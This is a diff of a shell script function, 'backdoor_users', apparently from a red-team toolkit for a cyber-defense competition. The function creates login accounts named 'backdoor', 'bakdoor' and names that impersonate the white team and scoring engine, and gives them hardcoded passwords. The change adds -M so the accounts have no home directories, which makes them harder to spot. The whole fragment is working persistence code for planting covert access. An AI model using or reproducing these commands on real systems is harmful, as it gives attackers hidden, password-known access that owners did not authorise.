@@ -43,11 +43,11 @@ backdoor_users(){
     echo -e "password\npassword" | passwd ucp
 
     # Normal users
-    useradd -u 135 whiteteamer -s /bin/bash
-    useradd -u 136 scoring -s /bin/bash
-    useradd -u 137 scoringengine -s /bin/bash 
-    useradd backdoor -s /bin/bash 
-    useradd bakdoor -s /bin/bash 
+    useradd -u 135 -g 135 -M whiteteamer -s /bin/bash
+    useradd -u 136 -g 136 -M scoring -s /bin/bash
+    useradd -u 137 -g 137 -M scoringengine -s /bin/bash 
+    useradd -M backdoor -s /bin/bash 
+    useradd -M bakdoor -s /bin/bash 
 
     echo -e "Tlqkfsus!\nTlqkfsus!" | passwd whiteteamer 
     echo -e "Tlqkfsus!\nTlqkfsus!" | passwd scoring 
